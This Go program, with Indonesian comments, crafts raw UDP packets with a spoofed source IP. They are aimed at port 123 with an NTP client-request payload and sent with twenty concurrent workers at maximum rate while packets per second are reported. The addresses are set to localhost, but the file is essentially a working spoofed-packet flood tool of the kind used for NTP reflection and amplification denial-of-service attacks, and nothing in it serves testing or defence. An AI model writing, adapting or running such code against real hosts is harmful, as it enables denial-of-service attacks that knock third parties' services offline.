package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const (
	iface        = "eth0"      
	srcIP        = "127.0.0.1" 
	dstIP        = "127.0.0.1" 
	numWorkers   = 20          
	totalPackets = 100000      
	batchSize    = 100         
)

var (
	packetData  []byte
	packetsSent uint64
	shouldStop  atomic.Bool // Untuk mengontrol goroutine
	wg         sync.WaitGroup
)

func buildPacket() []byte {
	src := net.ParseIP(srcIP)
	dst := net.ParseIP(dstIP)

	ip := &layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    src,
		DstIP:    dst,
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: 123,
		DstPort: 123,
	}
	udp.SetNetworkLayerForChecksum(ip)

	payload := make([]byte, 48)
	payload[0] = 0x1b

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	gopacket.SerializeLayers(buf, opts, ip, udp, gopacket.Payload(payload))

	return buf.Bytes()
}

func worker(id int, handle *pcap.Handle, jobs <-chan int) {
	defer wg.Done()
	
	localBatch := make([]byte, len(packetData)*batchSize)
	for i := 0; i < batchSize; i++ {
		copy(localBatch[i*len(packetData):], packetData)
	}

	for range jobs {
		if shouldStop.Load() {
			return
		}
		for i := 0; i < batchSize; i++ {
			if shouldStop.Load() {
				return
			}
			err := handle.WritePacketData(localBatch[i*len(packetData) : (i+1)*len(packetData)])
			if err != nil {
				continue
			}
			atomic.AddUint64(&packetsSent, 1)
		}
	}
}

func cleanup(handle *pcap.Handle) {
	shouldStop.Store(true)
	wg.Wait()
	handle.Close()
	fmt.Printf("\r\033[K") // Membersihkan baris saat ini
	os.Exit(0)
}

func main() {
	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	fmt.Println("🚀 Kirim spoofed UDP packet...")

	handle, err := pcap.OpenLive(iface, 65536, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}

	// Goroutine untuk menangani signal
	go func() {
		<-sigChan
		cleanup(handle)
	}()

	packetData = buildPacket()
	numBatches := totalPackets / batchSize
	jobs := make(chan int, numBatches)

	// Start workers
	for w := 1; w <= numWorkers; w++ {
		wg.Add(1)
		go worker(w, handle, jobs)
	}

	// Monitoring goroutine
	stopMonitor := make(chan bool)
	go func() {
		lastCount := uint64(0)
		ticker := time.NewTicker(time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				if shouldStop.Load() {
					return
				}
				currentCount := atomic.LoadUint64(&packetsSent)
				pps := currentCount - lastCount
				fmt.Printf("\r⚡ Current PPS: %d | Total: %d", pps, currentCount)
				lastCount = currentCount
			case <-stopMonitor:
				return
			}
		}
	}()

	start := time.Now()
	
	// Send jobs
	for j := 0; j < numBatches; j++ {
		if shouldStop.Load() {
			break
		}
		jobs <- j
	}
	close(jobs)

	wg.Wait()
	close(stopMonitor)

	if !shouldStop.Load() {
		duration := time.Since(start)
		finalCount := atomic.LoadUint64(&packetsSent)
		fmt.Printf("\n✅ Sukses kirim %d packet dalam %v\n", finalCount, duration)
		fmt.Printf("⚡ Average PPS: %.2f\n", float64(finalCount)/duration.Seconds())
	}

	cleanup(handle)
}